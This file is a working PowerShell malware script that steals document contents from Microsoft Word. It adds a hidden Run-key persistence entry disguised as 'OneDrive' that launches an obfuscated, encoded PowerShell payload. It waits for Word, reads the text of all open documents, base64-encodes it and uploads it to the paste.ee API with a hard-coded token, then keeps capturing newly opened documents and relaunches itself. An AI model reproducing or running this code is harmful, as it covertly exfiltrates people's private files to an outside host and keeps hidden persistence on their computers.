function post_http($url,$ReqBody) 
{ 
    $http_request = New-Object -ComObject Msxml2.XMLHTTP 
    $http_request.open("POST", $url, $false) 
    $http_request.setRequestHeader("Content-type","application/json") 
    $http_request.setRequestHeader("X-Auth-Token","uZ4AWxDB0wuOcQZWgmdpEUUDgQKLMYBVtb6wh2GGR") 
    $http_request.setRequestHeader("Content-length", $body.length); 
    $http_request.setRequestHeader("Connection", "close") 
    $http_request.send($ReqBody) 
} 

# add persistence by adding a value to the current user Run registry key (Loader) - no files wrriten to disk + no high-level permissions are required
# encoded command created with PowerShellMafia Out-EncodedCommand.ps1
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name OneDrive -Value 'powershell -NoP -NonI -W Hidden -E "cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAMQBWAFgAYgBiAGgAcwAzAEUASAAwADMANABIACsAWQByAGcAUgBvAGgAVwBwAFgAcwBSAEQAawB3AFUAVwBBAFMAbABIAGcAQgBQAEUAdABsAGwAeQBuAE0AWQBLAEEAMgBoADEASgBqAEYAYgBrAG0AdQBSAGEAVgBnADEALwBXAFIANwB5AFMAZgAyAEYARAByAGsAMwB5ADEAVgBhAHgAKwBoAEwAQgBVAGkAZwB5AEoAawB6AHcANQBsAHoAaABuADkAKwAvAFQAYgBOAFIARwBTADQARgBKAEIASwBiAFQANwBQAGoAVQBuADkAWgBxAGEAUwBUAHYATQBNAHIAdwBZAHkAWAByAGQAaABkACsAZQBXAHYAawBDAGYAcABqADMAKwByAFAAQQBxAFEAMgAzAGcASgBSAHoAagBLAGoAaQBaAGYATQBIAEkAUQBQAEIASwBMAG8AdgBsAGsAYgA1AFoASgByADMAdwB3ADkASABoAG0ALwBIADQAZABKAHQAcgBLAEYATQBVAHYAbgBkADYATQBoAHAANwBIAFgARABoAG8ARABsAGwAaQBjAGIAMgBWAG4ATwBOADUAaQB4AGYAdgBrAEUAVwBvAC8ASwA5AFYAMQBJAFkARgBDAFkAdwA2AHgAUwA5AGoAcwBmAFMATgBPAEUAUgBzAC8AZgBvAGYAdABGAFMAZQBJAC8ARgArAFIARAAwAE0AegBNAFAAeABuAEsAQgBnAG4AQwB5AGoAOAAvADcARgB6AGYARAB3AGIATgBWAGQAaABLADkALwAzAGcAeABXADgAYgBwADYALwBQAHoANABlAHoAOQB1ADgATwBqADMAdwBlAC8AbQBjAG0ATAAxAGIAeAAzAGMASABEADIANgBBAEIAbABvAGcAbQBLAG0AWgBuAGIAMgAwADYAbwBxAEcASAArAHQALwAzAEwANAAxAEUARQB1AGoAWQBSAGcAaABjAGwAVQB1AE4AMwBNAHgAQwB4AGYANwA5ADMAZAAvAFQAZAAzAGEAbQA2AGYARQBwAGQAUABtAFgAYQBvAE4AOABjAHkAdQBpAFkATABiAEgAVABIAEQATABEADIAdABUAGwAMwBaADAARwBVAEsAUgByAFYAQQBiAHMASABoAGcASgBBADYAYgB4AHgAZgBQAGQASABXAGQARQBMAGIAOABjAHIAYwBsADUARwBZADcAeAB4AG8AUwB2AFIAUwBSAGoATABtAGEAZgA5AHYAZgBQAEIAYQBjADEAaABnAGQAbwBCAG0AdQBEADIAaQA5AFIAQwA4AGYATABBAHAAaABNAHgAegBJAEgASABSAGwARgB2AHAAVgBoAEEAdwBZAFoAVAAyAEkAbwA2AFcAWAByAEIARQB6AEUAagBwAGcAMgBsAGQAUwBtAEgAUwBKAEMALwAvAFEAdAA0AFIAWgAzAHAASgB4AGEAdAAxADYATQBPAGwASQA4AGQAUgBYAGEAOQB5AGkAKwBvAFcANwBxAHYARwBUAGEAMgA3ACsAOAA5AFEAUgBkAGwAWQA1AGEAOQB6AHgALwBmAGcAbABsAEUAVABaADMAVwA5AFoANQBMAFEAeQA3AEkAUQArAFcARwBiAHEAWQBJAFMAegBhAGoAZgBKADIANgBtADEASQBkAEkAMgBIAE0ASABlAGYANwBzAGkAcwBVAGgAWgA0ADkAbABmAHYAZAA3AHMAcwA1AFcARgA1AG4AKwA3ADEAWAB0AGUAdAB0AFEAZQBsAE8ALwBYAE4AdABxADAAQgBMAEsAWQBDAG8ATgBLAGMAegBrAFcARQB0AGcANQBtAGoAaABCAGwAUwBsAEUAZQBrAEcAbABVAGMASgBZAEoAcQB0AHEATQBUAE4AUQBhAEYAcgBnAEcALwAxAEIAYQAzAHIAUgB6AGkARwBpAE8AMABRAEwANABGAEYAWgBTAHgAYwBBADEAcQBFAHcASQBxAG4AeABnADkANwBoAHAAYQBSAEMAUwBCAEEAdwByAHgAZwAxAE0AcABhAEkAOQBHADAAWQBiAHAAbwB4AEYAVwBNADEANQBnAHYANQBlAHUANQA0AEQAOQBrAE8AKwB2AGoAOQBEAEUANgBSAEsAUgBxAGcAMQBlAEMAcwB1AGIAQQBRAFAAQQBtAFEAdwBJAGgAOQBoAGsAcgBYAGwAUAB4AGMAWgBDAFQAcwBRAEMATQAzAGoATABFAG4AYQBOAGMAaAB0AHYAVwB6AEEAUgBSAG4AZgBYAHIAQgBFAHAAVQBTADQANABJAGEAegBoAFAAKwBCAHQAZgBYAEkASgBoAGUATQBFAHMAUQBVAEEAZwAxADcAegArAHEAagBpAFUASwAyAHEAUAAvAGUAVgBhAFUAawBhAHUAYQAxAHkAMwBzAEkAYwBnAHAAMgBEAHUAVgBsAGkAVwBXAFUATABXADEAbgBIAGUAVwBzAGkAcQB6AHQARQBpAFMAUgBGAHUAdwBjAEcANQBYAEUAMQBCAHQAYwBuAEQAZwBxAEEALwBVAG0AbABoAGoAYgBRAEUAMgBIAFYAeQB1AEYAdQBtAFAANABFAHMATwAzAEYARgBYAEoAZABJAFQAcQBtAHQAUABWAHcAaQBPAG0AOQBKAHcAbABKAEEAaABLAHIARQA5AE0AdgBjAFoAOABnAFAAcQB0AEMAMABJAEkAKwAvAFYATQBhADEAawBkAFUAWQBhAGEAWQBCADEAOABPAEMAegBUAGQAUgBFAHQAZwAzAFYAZgBLAFQAcgArADEAWABkAGQAcAB6AEkAaQBpACsAYgBnAFcAegBlAHEASQBEAGoAMwBYAE8AUQBsADUAeQAwAFkANwBZAFkARgAvAHkAcwBRAFkAbQA0ADEASABHAG8AQgA1ADcAYgBGAE8ASABQAHkAegA2AHYANgBqAHcATwBqADkAKwBTAEoAMABmAHYAWABrAGQARQByADYAUAAzAC8AbgB4AHEAOQAvADMANQBzAEoARgBJAHUAbgBKAFkARQByAHEAagA5AHAARwBVAGEASAByAHAAagBtAFIAQgBSAEoAWgAwAE8AMwBPAHoAUQBLADIANQBvAFEARwBnAGkATQBnADAASgBxAGgAYwBUAHcAQgBJAGkARAArAFcAUwBrAEoAQwB3AGwAawBhAEgAVgBxAEoAbAA4AHMAcgB5AHUAcgBnAFQATABxAG8AeABBAGYAbQBjAEsARgA2AG0AbgBOAFgAMwA2AE8AYQA0AFcAKwAwADYAMQBJAEoAKwA1AFUAagA1AHkAWAAvAGcARgBWAGoAeQBsAHQAeABzAEYANwBQAGoAMwB0AHoANAAwAFMARABPAHAANgBUADAATgB0AE4ATgBpAGwAYwB1AG0ALwBMAFkAQwBPAHEASQBXAE0AKwB4ADcAeQBsAGkASQAvAHEAVABsAFAARQBRADQAVgBFAEsAcQBSAFAANwBJAGEAVgBVAHMAWgA2AHMAbQBMADgAaABXAEwANQB2AEYARwA2ADcAegBXAE4AMQB0AEIAVwAvADAATgBOADIAMwBGAHgAWAA1AGQAbQBUADkARgBVADgASwBVADkANwBBAGYARgBxADQAdwBVAHMAVwBOAHgAdwBEAC8AaABVAHkAUwBWAE0ANgBCAFYAMwBiADMATQBWAHkATwBsADUAZAArAGMAdgAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA"' -ErrorAction "SilentlyContinue"

# check if word is running- if it's not - wait for it to start
while(1)
{ 
        if ((get-process "winword" -ea SilentlyContinue) -ne $Null)
        {
        # Wait for the process to initialize
        Start-Sleep -s 10
        break
        }
}

# Get the content of open word documents and send them over HTTPS requests to paste.ee base64 encdoed
$word = [System.Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application')
$docs = $word.Documents
$NamesArr = @()

foreach ($doc in $docs)
{
$DocName = $doc.Name
$NamesArr += ($DocName)
$Data = $doc.Content.Text
# Convert Data to Base64
$Data2 = [System.Text.Encoding]::Unicode.GetBytes($Data)
$Data2 =[Convert]::ToBase64String($Data2)
# Build request body and post to paste.ee API
$ReqBody = '{"description":"test","sections":[{"name":"'
$ReqBody += $DocName
$ReqBody += '","syntax":"autodetect","contents":"'
$ReqBody += $Data2
$ReqBody += '"}]}'
post_http "https://api.paste.ee/v1/pastes" $ReqBody
}

# look for new instances, in case the user switches back to an already leaked document, don't post it to pastebin
while (1)
{
    $ActiveDocName = $word.ActiveDocument.Name
    if (!($ActiveDocName -in $NamesArr))
    {
        $ActiveDocName = $word.ActiveDocument.Name
        $Data = $word.ActiveDocument.Content.Text
        $NamesArr += ($ActiveDocName)
        $Data2 = [System.Text.Encoding]::Unicode.GetBytes($Data)
        $Data2 =[Convert]::ToBase64String($Data2)
        $ReqBody = '{"description":"test","sections":[{"name":"'
        $ReqBody += $ActiveDocName
        $ReqBody += '","syntax":"autodetect","contents":"'
        $ReqBody += $Data2
        $ReqBody += '"}]}'
        post_http "https://api.paste.ee/v1/pastes" $ReqBody
    }
    if ((get-process "winword" -ea SilentlyContinue) -eq $Null)
    {
    break
    }
}

# if all word processes were closed, run from the beginning
powershell -NoP -NonI -W Hidden -E "cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAMQBWAFgAYgBiAGgAcwAzAEUASAAwADMANABIACsAWQByAGcAUgBvAGgAVwBwAFgAcwBSAEQAawB3AFUAVwBBAFMAbABIAGcAQgBQAEUAdABsAGwAeQBuAE0AWQBLAEEAMgBoADEASgBqAEYAYgBrAG0AdQBSAGEAVgBnADEALwBXAFIANwB5AFMAZgAyAEYARAByAGsAMwB5ADEAVgBhAHgAKwBoAEwAQgBVAGkAZwB5AEoAawB6AHcANQBsAHoAaABuADkAKwAvAFQAYgBOAFIARwBTADQARgBKAEIASwBiAFQANwBQAGoAVQBuADkAWgBxAGEAUwBUAHYATQBNAHIAdwBZAHkAWAByAGQAaABkACsAZQBXAHYAawBDAGYAcABqADMAKwByAFAAQQBxAFEAMgAzAGcASgBSAHoAagBLAGoAaQBaAGYATQBIAEkAUQBQAEIASwBMAG8AdgBsAGsAYgA1AFoASgByADMAdwB3ADkASABoAG0ALwBIADQAZABKAHQAcgBLAEYATQBVAHYAbgBkADYATQBoAHAANwBIAFgARABoAG8ARABsAGwAaQBjAGIAMgBWAG4ATwBOADUAaQB4AGYAdgBrAEUAVwBvAC8ASwA5AFYAMQBJAFkARgBDAFkAdwA2AHgAUwA5AGoAcwBmAFMATgBPAEUAUgBzAC8AZgBvAGYAdABGAFMAZQBJAC8ARgArAFIARAAwAE0AegBNAFAAeABuAEsAQgBnAG4AQwB5AGoAOAAvADcARgB6AGYARAB3AGIATgBWAGQAaABLADkALwAzAGcAeABXADgAYgBwADYALwBQAHoANABlAHoAOQB1ADgATwBqADMAdwBlAC8AbQBjAG0ATAAxAGIAeAAzAGMASABEADIANgBBAEIAbABvAGcAbQBLAG0AWgBuAGIAMgAwADYAbwBxAEcASAArAHQALwAzAEwANAAxAEUARQB1AGoAWQBSAGcAaABjAGwAVQB1AE4AMwBNAHgAQwB4AGYANwA5ADMAZAAvAFQAZAAzAGEAbQA2AGYARQBwAGQAUABtAFgAYQBvAE4AOABjAHkAdQBpAFkATABiAEgAVABIAEQATABEADIAdABUAGwAMwBaADAARwBVAEsAUgByAFYAQQBiAHMASABoAGcASgBBADYAYgB4AHgAZgBQAGQASABXAGQARQBMAGIAOABjAHIAYwBsADUARwBZADcAeAB4AG8AUwB2AFIAUwBSAGoATABtAGEAZgA5AHYAZgBQAEIAYQBjADEAaABnAGQAbwBCAG0AdQBEADIAaQA5AFIAQwA4AGYATABBAHAAaABNAHgAegBJAEgASABSAGwARgB2AHAAVgBoAEEAdwBZAFoAVAAyAEkAbwA2AFcAWAByAEIARQB6AEUAagBwAGcAMgBsAGQAUwBtAEgAUwBKAEMALwAvAFEAdAA0AFIAWgAzAHAASgB4AGEAdAAxADYATQBPAGwASQA4AGQAUgBYAGEAOQB5AGkAKwBvAFcANwBxAHYARwBUAGEAMgA3ACsAOAA5AFEAUgBkAGwAWQA1AGEAOQB6AHgALwBmAGcAbABsAEUAVABaADMAVwA5AFoANQBMAFEAeQA3AEkAUQArAFcARwBiAHEAWQBJAFMAegBhAGoAZgBKADIANgBtADEASQBkAEkAMgBIAE0ASABlAGYANwBzAGkAcwBVAGgAWgA0ADkAbABmAHYAZAA3AHMAcwA1AFcARgA1AG4AKwA3ADEAWAB0AGUAdAB0AFEAZQBsAE8ALwBYAE4AdABxADAAQgBMAEsAWQBDAG8ATgBLAGMAegBrAFcARQB0AGcANQBtAGoAaABCAGwAUwBsAEUAZQBrAEcAbABVAGMASgBZAEoAcQB0AHEATQBUAE4AUQBhAEYAcgBnAEcALwAxAEIAYQAzAHIAUgB6AGkARwBpAE8AMABRAEwANABGAEYAWgBTAHgAYwBBADEAcQBFAHcASQBxAG4AeABnADkANwBoAHAAYQBSAEMAUwBCAEEAdwByAHgAZwAxAE0AcABhAEkAOQBHADAAWQBiAHAAbwB4AEYAVwBNADEANQBnAHYANQBlAHUANQA0AEQAOQBrAE8AKwB2AGoAOQBEAEUANgBSAEsAUgBxAGcAMQBlAEMAcwB1AGIAQQBRAFAAQQBtAFEAdwBJAGgAOQBoAGsAcgBYAGwAUAB4AGMAWgBDAFQAcwBRAEMATQAzAGoATABFAG4AYQBOAGMAaAB0AHYAVwB6AEEAUgBSAG4AZgBYAHIAQgBFAHAAVQBTADQANABJAGEAegBoAFAAKwBCAHQAZgBYAEkASgBoAGUATQBFAHMAUQBVAEEAZwAxADcAegArAHEAagBpAFUASwAyAHEAUAAvAGUAVgBhAFUAawBhAHUAYQAxAHkAMwBzAEkAYwBnAHAAMgBEAHUAVgBsAGkAVwBXAFUATABXADEAbgBIAGUAVwBzAGkAcQB6AHQARQBpAFMAUgBGAHUAdwBjAEcANQBYAEUAMQBCAHQAYwBuAEQAZwBxAEEALwBVAG0AbABoAGoAYgBRAEUAMgBIAFYAeQB1AEYAdQBtAFAANABFAHMATwAzAEYARgBYAEoAZABJAFQAcQBtAHQAUABWAHcAaQBPAG0AOQBKAHcAbABKAEEAaABLAHIARQA5AE0AdgBjAFoAOABnAFAAcQB0AEMAMABJAEkAKwAvAFYATQBhADEAawBkAFUAWQBhAGEAWQBCADEAOABPAEMAegBUAGQAUgBFAHQAZwAzAFYAZgBLAFQAcgArADEAWABkAGQAcAB6AEkAaQBpACsAYgBnAFcAegBlAHEASQBEAGoAMwBYAE8AUQBsADUAeQAwAFkANwBZAFkARgAvAHkAcwBRAFkAbQA0ADEASABHAG8AQgA1ADcAYgBGAE8ASABQAHkAegA2AHYANgBqAHcATwBqADkAKwBTAEoAMABmAHYAWABrAGQARQByADYAUAAzAC8AbgB4AHEAOQAvADMANQBzAEoARgBJAHUAbgBKAFkARQByAHEAagA5AHAARwBVAGEASAByAHAAagBtAFIAQgBSAEoAWgAwAE8AMwBPAHoAUQBLADIANQBvAFEARwBnAGkATQBnADAASgBxAGgAYwBUAHcAQgBJAGkARAArAFcAUwBrAEoAQwB3AGwAawBhAEgAVgBxAEoAbAA4AHMAcgB5AHUAcgBnAFQATABxAG8AeABBAGYAbQBjAEsARgA2AG0AbgBOAFgAMwA2AE8AYQA0AFcAKwAwADYAMQBJAEoAKwA1AFUAagA1AHkAWAAvAGcARgBWAGoAeQBsAHQAeABzAEYANwBQAGoAMwB0AHoANAAwAFMARABPAHAANgBUADAATgB0AE4ATgBpAGwAYwB1AG0ALwBMAFkAQwBPAHEASQBXAE0AKwB4ADcAeQBsAGkASQAvAHEAVABsAFAARQBRADQAVgBFAEsAcQBSAFAANwBJAGEAVgBVAHMAWgA2AHMAbQBMADgAaABXAEwANQB2AEYARwA2ADcAegBXAE4AMQB0AEIAVwAvADAATgBOADIAMwBGAHgAWAA1AGQAbQBUADkARgBVADgASwBVADkANwBBAGYARgBxADQAdwBVAHMAVwBOAHgAdwBEAC8AaABVAHkAUwBWAE0ANgBCAFYAMwBiADMATQBWAHkATwBsADUAZAArAGMAdgAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA"
